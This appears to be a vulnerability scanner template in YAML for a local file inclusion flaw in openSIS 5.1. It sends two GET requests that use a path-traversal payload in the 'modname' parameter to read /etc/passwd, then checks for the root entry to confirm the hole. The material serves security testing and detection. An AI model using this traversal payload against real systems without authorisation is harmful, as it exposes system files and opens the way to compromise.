id: opensis-lfi
name: openSIS 5.1 - Local File Inclusion
severity: high
confidence: tentative
description: openSIS 5.1 is vulnerable to local file inclusion and allows attackers to obtain potentially sensitive information
  by executing arbitrary local scripts in the context of the web server process. This may allow the attacker to compromise
  the application and computer; other attacks are also possible.
reference: CWE-22
tags:
- opensis
- lfi
- edb
- vuln
requests:
- method: GET
  path: /opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php
  matchers: &id001
  - type: regex
    regex:
    - root:[x*]:0:0
  - type: status
    status:
    - 200
  condition: and
- method: GET
  path: /ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php
  matchers: *id001
  condition: and
